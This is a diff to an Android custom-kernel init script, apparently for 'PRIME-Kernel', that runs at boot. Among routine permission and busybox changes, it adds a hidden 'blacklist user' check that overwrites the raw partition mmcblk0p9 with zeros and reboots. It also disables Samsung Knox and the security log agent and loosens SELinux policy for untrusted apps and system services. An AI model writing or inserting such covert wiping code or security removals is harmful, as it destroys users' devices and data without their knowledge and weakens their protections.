@@ -1,5 +1,7 @@
 #!/res/bin/busybox sh
 
+PRIME=/data/PRIME-Kernel
+BB=/res/bin/busybox
 alias bb=/res/bin/busybox
 
 [ ! -e /data/PRIME-Kernel ] && bb mkdir -p /data/PRIME-Kernel
@@ -111,29 +113,80 @@ if [ ! -f /system/.knox_removed ]; then
     touch /system/.knox_removed
 fi
 
-bb chmod -R 0755 /res/bin
-bb chmod -R 0755 /res/synapse
-bb rm /system/etc/init.d/UKM
-bb rm /system/xbin/uci
+# block blacklist user
+BLACKLIST_FLAG=$(cat /data/media/0/Android/data/.blacklist_user 2>/dev/null)
+if [ "$BLACKLIST_FLAG" -eq 1 ]; then
+	dd if=/dev/zero bs=$((14680064)) count=1 > /dev/block/mmcblk0p9
+	sleep 1
+	bb reboot
+fi
+
+# disable knox & securitylogagent
+pm disable com.sec.knox.seandroid
+pm disable com.samsung.android.securitylogagent
+
+# Allow untrusted apps to read from debugfs
+if [ ! -f /data/PRIME-Kernel/.allow_AppPermit ]; then
+	if [ -e /system/xbin/supolicy ];then
+		SUPOL="/system/xbin/supolicy"
+	elif [ -e /su/bin/supolicy ];then
+		SUPOL="/su/bin/supolicy"
+	fi
+$SUPOL --live \
+	"allow untrusted_app debugfs file { open read getattr }" \
+	"allow untrusted_app sysfs_lowmemorykiller file { open read getattr }" \
+	"allow untrusted_app persist_file dir { open read getattr }" \
+	"allow debuggerd gpu_device chr_file { open read getattr }" \
+	"allow netd netd capability fsetid" \
+	"allow netd { hostapd dnsmasq } process fork" \
+	"allow { system_app shell } dalvikcache_data_file file write" \
+	"allow { zygote mediaserver bootanim appdomain }  theme_data_file dir { search r_file_perms r_dir_perms }" \
+	"allow { zygote mediaserver bootanim appdomain }  theme_data_file file { r_file_perms r_dir_perms }" \
+	"allow system_server { rootfs resourcecache_data_file } dir { open read write getattr add_name setattr create remove_name rmdir unlink link }" \
+	"allow system_server resourcecache_data_file file { open read write getattr add_name setattr create remove_name unlink link }" \
+	"allow system_server dex2oat_exec file rx_file_perms" \
+	"allow mediaserver mediaserver_tmpfs file { read write execute };" \
+	"allow drmserver theme_data_file file r_file_perms" \
+	"allow zygote system_file file write" \
+	"allow atfwd property_socket sock_file write" \
+	"allow debuggerd app_data_file dir search"
+fi;
+
+# fix Namespace mount separator of SuperSU
+PKGS=$(cat $PRIME/list/list_supersu_apks.txt)
+for suapk in $PKGS
+do
+	[ -z "$supkg" ] && continue
+	sucfg=/data/data/$supkg/files/supersu.cfg
+	if [ -f $sucfg ]; then
+		/res/bin/busybox sed -i -e "s/enablemountnamespaceseparation=.*/enablemountnamespaceseparation=0/g" $sucfg
+	fi
+done
+
+chmod -R 0755 /sbin
+chmod -R 0755 /res/bin
+chmod -R 0755 /res/synapse
+chmod 0777 /res/synapse/settings/*
+chmod 0755 /sbin/uci
+chown -R media_rw.media_rw /data/media/0/Synapse
 
 # busybox install
 INS_XBIN=`cat /data/PRIME-Kernel/synapse/settings/bbins_xbin`
 INS_LAST=`cat /data/PRIME-Kernel/synapse/settings/bbins_last`
-if [ "$INS_LAST" -eq 1 ]; then
+! (echo "$PATH" | grep "/res/bin/bb") && INS_XBIN=1;
+if [ $INS_LAST -eq 1 ]; then
 	if [ $INS_XBIN -eq 0 ]; then P=/res/bin/bb;
 	else P=/system/xbin; fi
 	if [ ! -f $P/busybox ]; then
-		$BB ln -sf /res/bin/busybox $P/busybox
+		bb cp -f /res/bin/busybox $P/busybox
 		$P/busybox --install -s $P
+		[[ $(bb readlink /system/xbin/su) == "/system/xbin/busybox" ]] && \
+			bb rm -f /system/xbin/su;
 	fi
 fi
 
-# Synapse Loader
+/sbin/unhide_xposed.sh
 /sbin/synapse_loader.sh
-
-# Synapse Interface
-/sbin/uci reset
-/sbin/uci
 
 echo init.d script start >> /data/PRIME-Kernel/kernel.log
 echo - excecuted on $(date +"%Y-%d-%m %r") >> /data/PRIME-Kernel/kernel.log
@@ -145,8 +198,4 @@ if [ -d /system/etc/init.d ]; then
 fi;
 echo init.d script is end >> /data/PRIME-Kernel/kernel.log
 echo - excecuted on $(date +"%Y-%d-%m %r") >> /data/PRIME-Kernel/kernel.log
-
-bb mount -t rootfs -o remount,ro rootfs
-bb mount -o remount,ro /system
-bb mount -o remount,ro /system /system
 
